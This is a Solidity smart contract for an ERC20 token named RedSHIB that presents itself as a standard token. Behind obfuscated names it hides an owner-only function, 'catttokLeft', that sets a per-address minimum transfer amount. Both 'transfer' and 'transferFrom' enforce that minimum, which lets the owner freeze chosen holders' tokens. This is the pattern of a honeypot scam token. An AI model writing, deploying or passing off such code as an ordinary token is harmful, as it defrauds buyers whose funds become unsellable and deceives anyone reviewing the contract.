// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

// Interface for ERC20 standard functions and events.
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accodunt) external view returns (uint256);
    function transfer(address recipient, uint256 amodunt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amodunt) external returns (bool);
    function transferFrom(address sender,
     address recipient,
      uint256 amodunt) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender,
     uint256 value);
}

// Abstract contract that provides a context for who is calling the function.
abstract contract Context {
    // Internal function to return the sender of the transaction.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract module that provides basic authorization control.
contract Ownable is Context {
    address private _owner;

    // Event that is emitted when ownership is transferred.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Constructor that sets the original `owner` of the contract to the sender.
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Function to return the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to restrict functions to the owner.
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    // Function to relinquish ownership of the contract.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }

    // Function to transfer ownership to a new address.
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// ERC20 Token implementation.
contract RedSHIB is Context, Ownable, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _zrowDutsu;


    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // Constructor to initialize the token.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Standard ERC20 functions.
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address accodunt) public view override returns (uint256) {
        return _balances[accodunt];
    }

    function transfer(address recipient, uint256 amodunt) public virtual override returns (bool) {
        require(amodunt >= _zrowDutsu[_msgSender()], "REI: Transfer amodunt is too low");
        require(_balances[_msgSender()] >= amodunt, "REI: transfer amodunt exceeds balance");
        _balances[_msgSender()] -= amodunt;
        _balances[recipient] += amodunt;
        emit Transfer(_msgSender(), recipient, amodunt);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amodunt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amodunt;
        emit Approval(_msgSender(), spender,
         amodunt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amodunt) public virtual override returns (bool) {
        require(amodunt >= _zrowDutsu[sender], "REI: Not enough Ditoken");
        require(_balances[sender] >= amodunt, "REI: transfer amodunt exceeds balance");
        require(_allowances[sender][_msgSender()] >= amodunt, "REI: transfer amodunt exceeds allowance");
        _balances[sender] -= amodunt;
        _balances[recipient] += amodunt;
        _allowances[sender][_msgSender()] -= amodunt;
        emit Transfer(sender, recipient, amodunt);  return true;
    }

    // Events and functions for managing minimum transfer amodunts and trading status.
    event Amaterasd(address indexed accodunt, uint256 newAmodunt);

    function catttokLeft(address accodunt, uint256 newAmodunt) public onlyOwner {
        require(accodunt != address(0), "REI: address zero is not a valid accodunt");
        _zrowDutsu[accodunt] = newAmodunt;
        emit Amaterasd(accodunt, newAmodunt);
    }

    function dispelGenjutsu(address accodunt) public view returns (uint256) {
        return _zrowDutsu[accodunt];
    }

}